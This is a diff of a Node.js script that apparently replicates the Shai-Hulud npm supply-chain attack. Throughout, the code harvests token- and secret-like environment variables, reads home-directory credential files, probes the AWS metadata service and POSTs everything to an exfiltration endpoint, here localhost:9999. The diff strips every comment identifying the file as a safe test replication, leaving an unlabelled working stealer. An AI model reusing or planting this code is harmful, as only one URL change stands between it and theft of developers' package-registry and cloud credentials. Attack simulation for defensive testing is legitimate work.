@@ -1,6 +1,3 @@
-// SAFE_TEST_MODE = true — all exfil goes to localhost:9999
-// Replicates: Shai-Hulud 1.0/2.0 supply chain attack
-
 const http = require("http");
 const https = require("https");
 const os = require("os");
@@ -8,10 +5,8 @@ const fs = require("fs");
 const path = require("path");
 
 const SAFE_TEST_MODE = true;
-const EXFIL_URL = "http://localhost:9999/exfil"; // Safe: nothing listening
-const IMDS_URL = "http://169.254.169.254/latest/meta-data/"; // AWS IMDS
-
-// --- Stage 1: Environment variable harvesting ---
+const EXFIL_URL = "http://localhost:9999/exfil";
+const IMDS_URL = "http://169.254.169.254/latest/meta-data/";
 
 const SENSITIVE_KEYS = [
   "NPM_TOKEN",
@@ -41,7 +36,7 @@ function harvestEnv() {
       harvested[key] = process.env[key];
     }
   }
-  // Also grab anything that looks like a token or secret
+
   for (const [key, value] of Object.entries(process.env)) {
     if (/token|secret|key|password|auth|credential/i.test(key)) {
       harvested[key] = value;
@@ -49,8 +44,6 @@ function harvestEnv() {
   }
   return harvested;
 }
-
-// --- Stage 2: Credential file reads ---
 
 function readCredentialFiles() {
   const home = os.homedir();
@@ -72,13 +65,11 @@ function readCredentialFiles() {
       const content = fs.readFileSync(filePath, "utf-8");
       files[filePath] = content;
     } catch (e) {
-      // File doesn't exist or no permission — continue
+
     }
   }
   return files;
 }
-
-// --- Stage 3: Cloud IMDS probing ---
 
 function probeIMDS(callback) {
   http
@@ -89,8 +80,6 @@ function probeIMDS(callback) {
     })
     .on("error", () => callback(null));
 }
-
-// --- Stage 4: Exfiltration ---
 
 function exfiltrate(payload) {
   const data = JSON.stringify(payload);
@@ -110,13 +99,11 @@ function exfiltrate(payload) {
 
   const req = http.request(options, () => {});
   req.on("error", () => {
-    // Connection refused — expected in safe test mode
+
   });
   req.write(data);
   req.end();
 }
-
-// --- Execute ---
 
 const stolen = {
   timestamp: new Date().toISOString(),
